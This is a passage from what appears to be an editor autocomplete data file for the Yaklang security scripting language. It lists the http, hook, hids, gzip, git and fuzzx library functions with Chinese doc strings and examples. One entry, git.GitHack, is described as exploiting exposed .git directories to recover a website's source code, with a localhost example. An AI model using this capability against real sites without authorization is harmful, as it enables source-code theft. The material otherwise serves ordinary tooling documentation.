              'ua(value any) http_struct.HttpOption  doc:useragent 是一个请求选项参数，用于指定请求的 User-Agent\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.ua("yaklang-http"))\n```\n',
          },
          {
            functionName: "timeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'timeout(f float64) http_struct.HttpOption  doc:WithTimeout 是一个请求选项参数，用于设置请求超时时间，单位是秒\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.WithTimeout(10))\n```\n',
          },
          {
            functionName: "source(${1:value /*type: string*/})",
            document: "",
            definitionStr:
              'source(value string) http_struct.HttpOption  doc:source 是一个请求选项参数，用于在请求记录保存到数据库时标识此次请求的来源\n\nExample:\n```\nrsp, err = http.Get("https://exmaple.com", http.save(true), http.source("test")) // 向 example.com 发起请求，会将此次请求保存到数据库中，指示此次请求的来源为test\n```\n',
          },
          {
            functionName: "showhead(${1:i})",
            document: "",
            definitionStr:
              'showhead(i any)  doc:showhead 获取指定请求结构体引用或响应结构体引用的原始报文头部并输出在标准输出\n\nExample:\n```\nreq, err = http.NewRequest("GET", "http://www.yaklang.com", http.timeout(10))\nhttp.showhead(req)\nrsp, err = http.Do(req)\nhttp.showhead(rsp)\n```\n',
          },
          {
            functionName: "show(${1:i})",
            document: "",
            definitionStr:
              'show(i any)  doc:show 获取指定请求结构体引用或响应结构体引用的原始报文并输出在标准输出\n\nExample:\n```\nreq, err = http.NewRequest("GET", "http://www.yaklang.com", http.timeout(10))\nhttp.show(req)\nrsp, err = http.Do(req)\nhttp.show(rsp)\n```\n',
          },
          {
            functionName: "session(${1:value})",
            document: "",
            definitionStr:
              'session(value any) http_struct.HttpOption  doc:session 是一个请求选项参数，用于根据传入的值指定会话，使用相同的值会使用同一个会话，同一个会话会自动复用 Cookie\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.session("request1"))\n```\n',
          },
          {
            functionName: "save(${1:value /*type: bool*/})",
            document: "",
            definitionStr:
              'save(value bool) http_struct.HttpOption  doc:save 是一个请求选项参数，用于指定是否将此次请求的记录保存在数据库中，默认为true即会保存到数据库\n\nExample:\n```\nhttp.Get("https://exmaple.com", http.save(true)) // 向 example.com 发起请求，会将此次请求保存到数据库中\n```\n',
          },
          {
            functionName: "runtimeID(${1:value /*type: string*/})",
            document: "",
            definitionStr: "runtimeID(value string) http_struct.HttpOption",
          },
          {
            functionName:
              "redirect(${1:c /*type: func(r *http.Request, vias []*http.Request) bool*/})",
            document: "",
            definitionStr:
              'redirect(c func(r *http.Request, vias []*http.Request) bool) http_struct.HttpOption  doc:redirect 是一个请求选项参数，它接收重定向处理函数，用于自定义重定向处理逻辑，返回 true 代表继续重定向，返回 false 代表终止重定向\n\n重定向处理函数中第一个参数是当前的请求结构体引用，第二个参数是之前的请求结构体引用\n\nExample:\n```\nrsp, err = http.Get("http://pie.dev/redirect/3", http.redirect(func(r, vias) bool { return true })\n```\n',
          },
          {
            functionName: "proxy(${1:values...})",
            document: "",
            definitionStr:
              'proxy(values ...string) http_struct.HttpOption  doc:proxy 是一个请求选项参数，用于设置一个或多个请求的代理，请求时会根据顺序找到一个可用的代理使用\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.proxy("http://127.0.0.1:7890", "http://127.0.0.1:8083"))\n```\n',
          },
          {
            functionName: "postparams(${1:i})",
            document: "",
            definitionStr:
              'postparams(i any) http_struct.HttpOption  doc:postparams 是一个请求选项参数，用于添加/指定 POST 参数，这会将参数进行 URL 编码\n\nExample:\n```\nrsp, err = http.Post("http://www.yaklang.com", http.postparams("a=b"), http.postparams("c=d"))\n```\n',
          },
          {
            functionName: "params(${1:i})",
            document: "",
            definitionStr:
              'params(i any) http_struct.HttpOption  doc:params 是一个请求选项参数，用于添加/指定 GET 参数，这会将参数进行 URL 编码\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.params("a=b"), http.params("c=d"))\n```\n',
          },
          {
            functionName: "noredirect()",
            document: "",
            definitionStr: "noredirect() http_struct.HttpOption",
          },
          {
            functionName: "json(${1:value})",
            document: "",
            definitionStr:
              'json(value any) http_struct.HttpOption  doc:json 是一个请求选项参数，用于指定 JSON 格式的请求体\n\n它会将传入的值进行 JSON 序列化，然后设置序列化后的值为请求体\n\nExample:\n```\nrsp, err = http.Post("https://pie.dev/post", http.header("Content-Type", "application/json"), http.json({"a": "b", "c": "d"}))\n```\n',
          },
          {
            functionName: "header(${1:key}, ${2:value})",
            document: "",
            definitionStr:
              'header(key any, value any) http_struct.HttpOption  doc:header 是一个请求选项参数，用于添加/指定请求头\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.header("AAA", "BBB"))\n```\n',
          },
          {
            functionName: "fromPlugin(${1:value /*type: string*/})",
            document: "",
            definitionStr: "fromPlugin(value string) http_struct.HttpOption",
          },
          {
            functionName: "fakeua()",
            document: "",
            definitionStr: "fakeua() http_struct.HttpOption",
          },
          {
            functionName: "dumphead(${1:i})",
            document: "",
            definitionStr:
              'dumphead(i any) ([]byte, error)  doc:dumphead 获取指定请求结构体引用或响应结构体引用的原始报文头部，返回原始报文头部与错误\n\nExample:\n```\nreq, err = http.NewRequest("GET", "http://www.yaklang.com", http.timeout(10))\nreqHeadRaw, err = http.dumphead(req)\nrsp, err = http.Do(req)\nrspHeadRaw, err = http.dumphead(rsp)\n```\n',
          },
          {
            functionName: "dump(${1:i})",
            document: "",
            definitionStr:
              'dump(i any) ([]byte, error)  doc:dump 获取指定请求结构体引用或响应结构体引用的原始报文，返回原始报文与错误\n\nExample:\n```\nreq, err = http.NewRequest("GET", "http://www.yaklang.com", http.timeout(10))\nreqRaw, err = http.dump(req)\nrsp, err = http.Do(req)\nrspRaw, err = http.dump(rsp)\n```\n',
          },
          {
            functionName: "cookie(${1:value})",
            document: "",
            definitionStr:
              'cookie(value any) http_struct.HttpOption  doc:header 是一个请求选项参数，用于设置完整的 Cookie 字段\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.WithCookie("a=b; c=d"))\n```\n',
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              'context(ctx context.Context) http_struct.HttpOption  doc:context 是一个请求选项参数，用于设置请求的上下文\n\nExample:\n```\nctx = context.New()\nrsp, err = http.Get("http://www.example.com", http.context(ctx)) // 向 example.com 发起请求，使用指定的上下文\n```\n',
          },
          {
            functionName: "body(${1:value})",
            document: "",
            definitionStr:
              'body(value any) http_struct.HttpOption  doc:body 是一个请求选项参数，用于指定请求体\n\nExample:\n```\nrsp, err = http.Post("https://pie.dev/post", http.body("a=b&c=d"))\n```\n',
          },
          {
            functionName: "RequestToSha256(${1:url /*type: string*/})",
            document: "",
            definitionStr: "RequestToSha256(url string) (string, error)",
          },
          {
            functionName: "RequestToSha1(${1:url /*type: string*/})",
            document: "",
            definitionStr: "RequestToSha1(url string) (string, error)",
          },
          {
            functionName: "RequestToMMH3Hash128x64(${1:url /*type: string*/})",
            document: "",
            definitionStr: "RequestToMMH3Hash128x64(url string) (string, error)",
          },
          {
            functionName: "RequestToMMH3Hash128(${1:url /*type: string*/})",
            document: "",
            definitionStr: "RequestToMMH3Hash128(url string) (string, error)",
          },
          {
            functionName: "RequestToMD5(${1:url /*type: string*/})",
            document: "",
            definitionStr: "RequestToMD5(url string) (string, error)",
          },
          {
            functionName: "RequestFaviconHash(${1:urlRaw /*type: string*/})",
            document: "",
            definitionStr: "RequestFaviconHash(urlRaw string) (string, error)",
          },
          {
            functionName:
              "Request(${1:method /*type: string*/}, ${2:url /*type: string*/}, ${3:options...})",
            document: "",
            definitionStr:
              'Request(method string, url string, options ...http_struct.HttpOption) (*http_struct.YakHttpResponse, error)  doc:Request 根据指定的 URL 发起请求，它的第一个参数是 URL ，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置请求体，设置超时时间等\n\n返回响应结构体引用与错误\n\n! 已弃用，使用 poc.Do 代替\n\nExample:\n```\nrsp, err = http.Request("POST","http://pie.dev/post", http.body("a=b&c=d"), http.timeout(10))\n```\n',
          },
          {
            functionName: "Raw(${1:i})",
            document: "",
            definitionStr:
              'Raw(i any) (*http.Request, error)  doc:Raw 根据原始请求报文生成请求结构体引用，返回请求结构体引用与错误\n\n注意，此函数只会生成请求结构体引用，不会发起请求\n\n! 已弃用，使用 poc.HTTP 或 poc.HTTPEx 代替\n\nExample:\n```\nreq, err = http.Raw("GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName: "Post(${1:url /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'Post(url string, options ...http_struct.HttpOption) (*http_struct.YakHttpResponse, error)  doc:Post 根据指定的 URL 发起 POST 请求，它的第一个参数是 URL ，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置请求体，设置超时时间等\n\n返回响应结构体引用与错误\n\n! 已弃用，使用 poc.Post 代替\n\nExample:\n```\nrsp, err = http.Post("http://pie.dev/post", http.body("a=b&c=d"), http.timeout(10))\n```\n',
          },
          {
            functionName:
              "NewRequest(${1:method /*type: string*/}, ${2:url /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'NewRequest(method string, url string, opts ...http_struct.HttpOption) (*http_struct.YakHttpRequest, error)  doc:NewRequest 根据指定的 method 和 URL 生成请求结构体引用，返回请求结构体引用与错误，它的第一个参数是 URL ，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置超时时间等\n\n注意，此函数只会生成请求结构体引用，不会发起请求\n\n! 已弃用\n\nExample:\n```\nreq, err = http.NewRequest("GET", "http://www.yaklang.com", http.timeout(10))\n```\n',
          },
          {
            functionName: "GetAllBody(${1:raw})",
            document: "",
            definitionStr:
              'GetAllBody(raw any) []byte  doc:GetAllBody 获取响应结构体引用的原始响应报文\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com")\nraw = http.GetAllBody(rsp)\n```\n',
          },
          {
            functionName: "Get(${1:url /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'Get(url string, options ...http_struct.HttpOption) (*http_struct.YakHttpResponse, error)  doc:Get 根据指定的 URL 发起 GET 请求，它的第一个参数是 URL ，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置超时时间等\n\n返回响应结构体引用与错误\n\n! 已弃用，使用 poc.Get 代替\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.timeout(10))\n```\n',
          },
          {
            functionName:
              "ExtractFaviconURL(${1:siteURL /*type: string*/}, ${2:content /*type: []byte*/})",
            document: "",
            definitionStr:
              'ExtractFaviconURL(siteURL string, content []byte) (string, error)  doc:ExtractFaviconURL will receive a site url and html content return the favicon url\n\nExample:\n\n\thttp.ExtractFaviconURL("https://www.baidu.com", []byte(`<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">`))\n\thttp.ExtractFaviconURL("https://www.baidu.com", []byte(`<link rel="icon" href="/favicon.ico" type="image/x-icon">`))\n\thttp.ExtractFaviconURL("https://www.baidu.com", []byte(`<link rel="icon" href="/favicon.png" type="image/png">`))\n',
          },
          {
            functionName: "Do(${1:i})",
            document: "",
            definitionStr:
              'Do(i any) (*http.Response, error)  doc:Do 根据构造好的请求结构体引用发送请求，返回响应结构体引用与错误\n\n! 已弃用\n\nExample:\n```\nreq, err = http.Raw("GET / HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n")\nrsp, err = http.Do(req)\n```\n',
          },
        ],
      },
      {
        libName: "hook",
        prefix: "hook.",
        functions: [
          {
            functionName:
              "RemoveYakitPluginByName(${1:mng /*type: *YakToCallerManager*/}, ${2:scriptNames...})",
            document: "",
            definitionStr:
              "RemoveYakitPluginByName(mng *YakToCallerManager, scriptNames ...string)",
          },
          {
            functionName:
              "NewMixPluginCallerWithFilter(${1:webFilter /*type: filter.Filterable*/})",
            document: "",
            definitionStr:
              "NewMixPluginCallerWithFilter(webFilter filter.Filterable) (*MixPluginCaller, error)",
          },
          {
            functionName: "NewMixPluginCaller()",
            document: "",
            definitionStr: "NewMixPluginCaller() (*MixPluginCaller, error)",
          },
          {
            functionName: "NewManager()",
            document: "",
            definitionStr: "NewManager() *YakToCallerManager",
          },
          {
            functionName:
              "LoadYakitPluginContext(${1:mng /*type: *YakToCallerManager*/}, ${2:ctx /*type: context.Context*/}, ${3:scriptType /*type: string*/}, ${4:hookNames...})",
            document: "",
            definitionStr:
              "LoadYakitPluginContext(mng *YakToCallerManager, ctx context.Context, scriptType string, hookNames ...string) error",
          },
          {
            functionName:
              "LoadYakitPluginByName(${1:mng /*type: *YakToCallerManager*/}, ${2:scriptName /*type: string*/}, ${3:hookNames...})",
            document: "",
            definitionStr:
              "LoadYakitPluginByName(mng *YakToCallerManager, scriptName string, hookNames ...string) error",
          },
          {
            functionName:
              "LoadYakitPlugin(${1:mng /*type: *YakToCallerManager*/}, ${2:scriptType /*type: string*/}, ${3:hookNames...})",
            document: "",
            definitionStr:
              "LoadYakitPlugin(mng *YakToCallerManager, scriptType string, hookNames ...string) error",
          },
          {
            functionName:
              "CallYakitPluginFunc(${1:scriptName /*type: string*/}, ${2:hookName /*type: string*/})",
            document: "",
            definitionStr:
              "CallYakitPluginFunc(scriptName string, hookName string) (any, error)",
          },
        ],
      },
      {
        libName: "hids",
        prefix: "hids.",
        functions: [
          {
            functionName: "ShowMonitorInterval()",
            document: "",
            definitionStr:
              "ShowMonitorInterval()  doc:ShowMonitorInterval 在标准输出中输出全局健康管理器的监控间隔(单位：秒)\n\nExample:\n```\nhids.ShowMonitorInterval()\n```\n",
          },
          {
            functionName: "SetMonitorInterval(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              "SetMonitorInterval(i float64)  doc:SetMonitorInterval 设置全局健康管理器的监控间隔(单位：秒)，如果在全局健康管理器运行时调用，会重置全局健康管理器\n\nExample:\n```\nhids.SetMonitorInterval(1)\n```\n",
          },
          {
            functionName:
              "MemoryPercentCallback(${1:callback /*type: func(i float64)*/})",
            document: "",
            definitionStr:
              'MemoryPercentCallback(callback func(i float64))  doc:MemoryPercentCallback 当内存使用率发生变化时，调用 callback\n\nExample:\n```\nhids.Init()\nhids.MemoryPercentCallback(func(i) {\nif (i > 50) { println("memory precent is over 50%") } // 当内存使用率超过50%时输出信息\n})\n```\n',
          },
          {
            functionName: "MemoryPercent()",
            document: "",
            definitionStr:
              'MemoryPercent() float64  doc:MemoryPercent 获取当前系统的内存使用率\n\nExample:\n```\nprintf("%f%%\\n", hids.MemoryPercent())\n```\n',
          },
          {
            functionName: "Init()",
            document: "",
            definitionStr:
              "Init()  doc:Init 初始化全局健康管理器\n\nExample:\n```\nhids.Init()\n```\n",
          },
          {
            functionName:
              "CPUPercentCallback(${1:callback /*type: func(i float64)*/})",
            document: "",
            definitionStr:
              'CPUPercentCallback(callback func(i float64))  doc:CPUPercentCallback 当 CPU 使用率发生变化时，调用 callback 函数\n\nExample:\n```\nhids.Init()\nhids.CPUPercentCallback(func(i) {\nif (i > 50) { println("cpu precent is over 50%") } // 当 CPU 使用率超过50%时输出信息\n})\n```\n',
          },
          {
            functionName: "CPUPercent()",
            document: "",
            definitionStr:
              'CPUPercent() float64  doc:CPUPercent 获取当前系统的 CPU 使用率\n\nExample:\n```\nprintf("%f%%\\n", hids.CPUPercent())\n```\n',
          },
          {
            functionName:
              "CPUAverageCallback(${1:callback /*type: func(i float64)*/})",
            document: "",
            definitionStr:
              'CPUAverageCallback(callback func(i float64))  doc:CPUPercentCallback 当 CPU 使用率平均值发生变化时，调用 callback 函数\n\nExample:\n```\nhids.Init()\nhids.CPUAverageCallback(func(i) {\nif (i > 50) { println("cpu average precent is over 50%") } // 当 CPU 使用率平均值超过50%时输出信息\n})\n```\n',
          },
          {
            functionName: "CPUAverage()",
            document: "",
            definitionStr:
              'CPUAverage() float64  doc:CPUAverage 获取当前系统的 CPU 使用率平均值\n\nExample:\n```\nprintf("%f%%\\n", hids.CPUAverage())\n```\n',
          },
        ],
      },
      {
        libName: "gzip",
        prefix: "gzip.",
        functions: [
          {
            functionName: "IsGzip(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "IsGzip(raw []byte) bool",
          },
          {
            functionName: "Decompress(${1:ret /*type: []byte*/})",
            document: "",
            definitionStr: "Decompress(ret []byte) ([]byte, error)",
          },
          {
            functionName: "Compress(${1:i})",
            document: "",
            definitionStr: "Compress(i any) ([]byte, error)",
          },
        ],
      },
      {
        libName: "git",
        prefix: "git.",
        functions: [
          {
            functionName: "verify(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'verify(b bool) Option  doc:verify 是一个选项函数，用于指定其他 Git 操作（例如Clone）时是否验证TLS证书\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.recursive(true), git.verify(false))\n```\n',
          },
          {
            functionName: "useLocalGitBinary(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'useLocalGitBinary(b bool) Option  doc:useLocalGitBinary 是一个GitHack选项函数，用于指定是否使用本地环境变量的git二进制文件来执行`git fsck`命令，这个命令用于尽可能恢复完整的git仓库，默认为true\n\nExample:\n```\ngit.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.useLocalGitBinary(true))\n```\n',
          },
          {
            functionName: "threads(${1:threads /*type: int*/})",
            document: "",
            definitionStr:
              'threads(threads int) Option  doc:threads 是一个GitHack选项函数，用于指定并发数，默认为8\n\nExample:\n```\ngit.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.threads(8))\n```\n',
          },
          {
            functionName: "remote(${1:remote /*type: string*/})",
            document: "",
            definitionStr:
              'remote(remote string) Option  doc:remote 是一个选项函数，用于指定其他 Git 操作（例如Pull）时的远程仓库名称，默认为origin\n\nExample:\n```\ngit.Pull("C:/Users/xxx/Desktop/yaklang", git.verify(false), git.remote("origin"))\n```\n',
          },
          {
            functionName: "recursive(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'recursive(b bool) Option  doc:recursive 是一个选项函数，用于指定其他 Git 操作（例如Clone）时的是否递归克隆子模块，默认为false\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.recursive(true))\n```\n',
          },
          {
            functionName: "noFetchTags(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'noFetchTags(b bool) Option  doc:noFetchTags 是一个选项函数，用于指定获取(fetch)操作时是否不拉取标签\n\nExample:\n```\ngit.Fetch("C:/Users/xxx/Desktop/yaklang", git.noFetchTags(true)) // 不拉取标签\n```\n',
          },
          {
            functionName: "httpOpts(${1:opts...})",
            document: "",
            definitionStr:
              'httpOpts(opts ...poc.PocConfigOption) Option  doc:httpOpts 是一个GitHack选项函数，用于指定GitHack的HTTP选项，其接收零个到多个poc的请求选项函数\n\nExample:\n```\ngit.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.httpOpts(poc.timeout(10), poc.https(true)))\n```\n',
          },
          {
            functionName:
              "handleReference(${1:f /*type: func(r *plumbing.Reference) error*/})",
            document: "",
            definitionStr:
              'handleReference(f func(r *plumbing.Reference) error) Option  doc:handleReference 是一个选项函数，它接收一个回调函数，这个函数有一个参数，其为引用记录结构体(reference)，每次遍历到过滤后的引用时，就会调用这个回调函数\n\nExample:\n```\n// 遍历提交记录，过滤名字中包含ci的引用记录，打印剩余的每个引用记录\ngit.IterateCommit("D:/coding/golang/src/yaklang",\ngit.filterReference((ref) => {return !ref.Name().Contains("ci")}),\ngit.handleReference((ref) => { println(ref.String()) }))\n```\n',
          },
          {
            functionName:
              "handleCommit(${1:f /*type: func(r *object.Commit) error*/})",
            document: "",
            definitionStr:
              'handleCommit(f func(r *object.Commit) error) Option  doc:handleCommit 是一个选项函数，它接收一个回调函数，这个函数有一个参数，其为提交记录结构体(commit)，每次遍历到一个过滤后的提交记录时，就会调用这个回调函数\n\nExample:\n```\n// 遍历提交记录，打印每个提交记录\ngit.IterateCommit("D:/coding/golang/src/yaklang", git.handleCommit((c) => { println(c.String()) }))\n```\n',
          },
          {
            functionName: "force(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'force(b bool) Option  doc:force 是一个选项函数，用于指定其他 Git 操作（例如Pull）时是否强制执行，默认为false\n\nExample:\n```\ngit.Pull("C:/Users/xxx/Desktop/yaklang", git.verify(false), git.force(true))\n```\n',
          },
          {
            functionName:
              "filterReference(${1:f /*type: func(r *plumbing.Reference) bool*/})",
            document: "",
            definitionStr:
              'filterReference(f func(r *plumbing.Reference) bool) Option  doc:filterReference 是一个选项函数，它接收一个回调函数，这个函数有一个参数，其为引用记录结构体(reference)，每次遍历到引用时，就会调用这个回调函数，这个函数还有一个返回值，通过这个返回值来决定是否过滤掉这个引用\n\nExample:\n```\n// 遍历提交记录，过滤名字中包含ci的引用记录，打印剩余的每个引用记录\ngit.IterateCommit("D:/coding/golang/src/yaklang",\ngit.filterReference((ref) => {return !ref.Name().Contains("ci")}),\ngit.handleReference((ref) => { println(ref.String()) }))\n```\n',
          },
          {
            functionName:
              "filterCommit(${1:f /*type: func(r *object.Commit) bool*/})",
            document: "",
            definitionStr:
              'filterCommit(f func(r *object.Commit) bool) Option  doc:filterCommit 是一个选项函数，它接收一个回调函数，这个函数有一个参数，其为提交记录结构体(commit)，每次遍历到提交记录时，就会调用这个回调函数，这个函数还有一个返回值，通过这个返回值来决定是否过滤掉这个提交记录\n\nExample:\n```\n// 遍历提交记录，过滤作者名字为xxx的提交记录，打印剩余的每个提交记录\ngit.IterateCommit("D:/coding/golang/src/yaklang",\ngit.filterCommit((c) => { return c.Author.Name != "xxx" }),\ngit.handleCommit((c) => { println(c.String()) }))\n```\n',
          },
          {
            functionName: "fetchAllTags(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'fetchAllTags(b bool) Option  doc:fetchAllTags 是一个选项函数，用于指定获取(fetch)操作时是否拉取所有标签\n\nExample:\n```\ngit.Fetch("C:/Users/xxx/Desktop/yaklang", git.fetchAllTags(true)) // 拉取所有标签\n```\n',
          },
          {
            functionName: "depth(${1:depth /*type: int*/})",
            document: "",
            definitionStr:
              'depth(depth int) Option  doc:depth 是一个选项函数，用于指定其他 Git 操作（例如Clone）时的最大深度，默认为1\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.Depth(1))\n```\n',
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              'context(ctx context.Context) Option  doc:context 是一个选项函数，用于指定其他 Git 操作（例如Clone）时的上下文\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.context(context.New()))\n```\n',
          },
          {
            functionName: "checkoutKeep(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'checkoutKeep(b bool) Option  doc:checkoutKeep 是一个选项函数，用于指定检出(checkout)操作时，本地更改（索引或工作树更改）是否被保留，如果保留，就可以将它们提交到目标分支，默认为false\n\nExample:\n```\ngit.Checkout("C:/Users/xxx/Desktop/yaklang", "old-branch", git.checkoutKeep(true))\n```\n',
          },
          {
            functionName: "checkoutForce(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'checkoutForce(b bool) Option  doc:fetchAllTags 是一个选项函数，用于指定检出(checkout)操作时是否强制\n\nExample:\n```\ngit.Checkout("C:/Users/xxx/Desktop/yaklang", "old-branch", git.checkoutForce(true))\n```\n',
          },
          {
            functionName: "checkoutCreate(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'checkoutCreate(b bool) Option  doc:fetchAllTags 是一个选项函数，用于指定检出(checkout)操作时是否创建新分支\n\nExample:\n```\ngit.Checkout("C:/Users/xxx/Desktop/yaklang", "feat/new-branch", git.checkoutCreate(true))\n```\n',
          },
          {
            functionName:
              "auth(${1:username /*type: string*/}, ${2:password /*type: string*/})",
            document: "",
            definitionStr:
              'auth(username string, password string) Option  doc:auth 是一个选项函数，用于指定其他 Git 操作（例如Clone）时的认证用户名和密码\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.auth("admin", "admin"))\n```\n',
          },
          {
            functionName: "SetProxy(${1:proxies...})",
            document: "",
            definitionStr:
              'SetProxy(proxies ...string)  doc:SetProxy 是一个辅助函数，用于指定其他 Git 操作（例如Clone）的代理\n\nExample:\n```\ngit.SetProxy("http://127.0.0.1:1080")\n```\n',
          },
          {
            functionName: "Pull(${1:localPath /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Pull(localPath string, opts ...Option) error  doc:Pull 用于指定一个本地仓库，并从其远程仓库中获取代码并合并到本地仓库中，这种行为称之为拉取(pull)，它还可以接收零个到多个选项函数，用于影响拉取行为\n\nExample:\n```\ngit.Pull("C:/Users/xxx/Desktop/yaklang", git.verify(false), git.remote("origin"))\n```\n',
          },
          {
            functionName:
              "IterateCommit(${1:localRepos /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr:
              'IterateCommit(localRepos string, opt ...Option) error  doc:IterateCommit 用于指定一个本地仓库，遍历其所有的提交记录(commit)，并对过滤后的每个提交记录执行指定的操作，它还可以接收零个到多个选项函数，用于配置回调函数\n\nExample:\n```\n// 遍历提交记录，过滤名字中包含ci的引用记录，过滤作者名字为xxx的提交记录，打印剩余的每个提交记录\ngit.IterateCommit("D:/coding/golang/src/yaklang",\ngit.filterReference((ref) => {return !ref.Name().Contains("ci")}),\ngit.filterCommit((c) => { return c.Author.Name != "xxx" }),\ngit.handleCommit((c) => { println(c.String()) }))\n```\n',
          },
          {
            functionName:
              "GitHack(${1:remoteRepoURL /*type: string*/}, ${2:localPath /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr error)  doc:GitHack 是一个用于利用 Git 源码泄露漏洞的函数\n\nGit源码泄露漏洞是指：由于网站服务器的错误配置，可以通过 HTTP / HTTPS 直接访问到网站 .git 目录下的文件，从而导致源码泄露\n\nExample:\n```\ngit.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.threads(8))\n```\n',
          },
          {
            functionName: "Fetch(${1:localPath /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Fetch(localPath string, opts ...Option) error  doc:Fetch 用于指定一个本地仓库，并从其远程仓库中获取代码，它还可以接收零个到多个选项函数，用于影响获取行为\n\nExample:\n```\ngit.Fetch("C:/Users/xxx/Desktop/yaklang", git.verify(false), git.remote("origin"), git.fetchAllTags(true))\n```\n',
          },
          {
            functionName:
              "Clone(${1:u /*type: string*/}, ${2:localPath /*type: string*/}, ${3:opt...})",
            document: "",
            definitionStr:
              'Clone(u string, localPath string, opt ...Option) error  doc:Clone 用于克隆远程仓库并存储到本地路径中，它还可以接收零个到多个选项函数，用于影响克隆行为\n\nExample:\n```\ngit.Clone("https://github.com/yaklang/yaklang", "C:/Users/xxx/Desktop/yaklang", git.recursive(true), git.verify(false))\n```\n',
          },
          {
            functionName:
              "Checkout(${1:localPath /*type: string*/}, ${2:ref /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Checkout(localPath string, ref string, opts ...Option) error  doc:Checkout 用于指定一个本地仓库，切换其分支或者恢复工作树的文件，这种行为称之为检出(checkout)，它还可以接收零个到多个选项函数，用于影响检出行为\n\nExample:\n```\ngit.Checkout("C:/Users/xxx/Desktop/yaklang", "feat/new-branch", git.checkoutCreate(true)) // 创建新分支\ngit.Checkout("C:/Users/xxx/Desktop/yaklang", "old-branch", git.checkoutForce(true)) // 强制切换\n```\n',
          },
        ],
      },
      {
        libName: "fuzzx",
        prefix: "fuzzx.",
        functions: [
          {
            functionName: "timeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "timeout(f float64) HttpPoolConfigOption",
          },
          {
            functionName: "source(${1:i /*type: string*/})",
            document: "",
            definitionStr: "source(i string) HttpPoolConfigOption",
          },
          {
            functionName: "runtimeID(${1:i /*type: string*/})",
            document: "",
            definitionStr: "runtimeID(i string) HttpPoolConfigOption",
          },
          {
            functionName: "redirectTimes(${1:f /*type: int*/})",
            document: "",
            definitionStr: "redirectTimes(f int) HttpPoolConfigOption",
          },
          {
            functionName: "proxy(${1:proxies...})",
            document: "",
            definitionStr: "proxy(proxies ...string) HttpPoolConfigOption",
          },
          {
            functionName: "port(${1:port /*type: int*/})",
            document: "",
            definitionStr: "port(port int) HttpPoolConfigOption",
          },
          {
            functionName: "noRedirect(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "noRedirect(i bool) HttpPoolConfigOption",
          },
          {
            functionName: "noFixContentLength(${1:f /*type: bool*/})",
            document: "",
            definitionStr: "noFixContentLength(f bool) HttpPoolConfigOption",
          },
          {
            functionName: "namingContext(${1:invokerName /*type: string*/})",
            document: "",
            definitionStr:
              "namingContext(invokerName string) HttpPoolConfigOption",
          },
          {
            functionName: "https(${1:f /*type: bool*/})",
            document: "",
            definitionStr: "https(f bool) HttpPoolConfigOption",
          },
          {
            functionName:
              "host(${1:h /*type: string*/}, ${2:isHttps /*type: bool*/})",
            document: "",
            definitionStr: "host(h string, isHttps bool) HttpPoolConfigOption",
          },
          {
            functionName: "fromPlugin(${1:plugin /*type: string*/})",
            document: "",
            definitionStr: "fromPlugin(plugin string) HttpPoolConfigOption",
          },
          {
            functionName: "delay(${1:b /*type: float64*/})",
            document: "",
            definitionStr: "delay(b float64) HttpPoolConfigOption",
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
